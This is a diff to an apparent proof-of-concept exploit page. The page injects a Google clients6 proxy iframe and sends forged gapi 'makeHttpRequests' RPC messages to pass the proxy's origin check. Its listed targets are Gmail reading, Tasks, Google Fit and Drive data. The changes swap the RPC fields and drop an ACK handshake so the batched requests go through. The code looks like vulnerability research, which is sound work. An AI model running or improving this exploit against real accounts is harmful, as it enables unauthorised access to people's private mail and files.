@@ -29,7 +29,8 @@ All via single makeHttpRequests RPC call from clients6 proxy.
 <b>NEW-001:</b> Gmail read | <b>NEW-003:</b> Tasks | <b>NEW-004:</b> Google Fit | <b>NEW-005:</b> Drive (confirm same proxy)
 </p>
 <p class="warn">
-<b>v3 ACK handshake:</b> Sends ACK on ready:TOKEN → registers our origin → origin check passes.
+<b>v4 fix:</b> s:"makeHttpRequests" f:".." — field order was swapped in prior versions causing origin check failure.
+_.jf.register fires $a() synchronously so D[".."] = rpcToken is set before any message arrives.
 </p>
 
 <hr>
@@ -90,7 +91,6 @@ document.body.appendChild(proxyIframe);
 
 log('ok', 'Proxy iframe injected: ' + proxyUrl.substring(0, 100) + '...');
 
-let ackSent = false;
 let requestSent = false;
 let resultsReceived = 0;
 const TOTAL_REQUESTS = 5;
@@ -105,22 +105,10 @@ window.addEventListener('message', function(e) {
   try { msg = JSON.parse(e.data); } catch(err) { return; }
   if (!msg) return;
 
-  // ACK handshake
-  if (!ackSent && msg.s && msg.s.startsWith('ready:') && msg.g === true) {
-    ackSent = true;
-    log('ok', 'Ready signal received (g:true). Sending ACK to register our origin...');
-    const ack = JSON.stringify({
-      s: '..',
-      f: msg.s,
-      c: msg.c,
-      a: [],
-      t: rpcToken,
-      l: null,
-      g: false
-    });
-    proxyIframe.contentWindow.postMessage(ack, 'https://clients6.google.com');
-    log('ok', 'ACK sent. Waiting 500ms then sending multi-API makeHttpRequests...');
-    setTimeout(sendRequests, 500);
+  // Ready signal: token already set synchronously. Send immediately.
+  if (msg.s && msg.s.startsWith('ready:') && !requestSent) {
+    log('ok', 'Ready signal received. Sending multi-API batch...');
+    sendRequests();
   }
 
   // Callback handler
@@ -240,8 +228,8 @@ function sendRequests() {
 
   proxyIframe.contentWindow.postMessage(
     JSON.stringify({
-      s: '..',
-      f: 'makeHttpRequests',
+      s: 'makeHttpRequests',
+      f: '..',
       c: 'multi-poc-1',
       a: [requests],
       t: rpcToken,
@@ -256,8 +244,8 @@ function sendRequests() {
 
 // Fallback if no ready signal in 5s
 setTimeout(function() {
-  if (!ackSent) {
-    log('warn', '5s: No ready signal received. Attempting without ACK (GAPI may not require it)...');
+  if (!requestSent) {
+    log('warn', '5s: No ready signal received. Sending anyway (token set synchronously)...');
     sendRequests();
   }
 }, 5000);
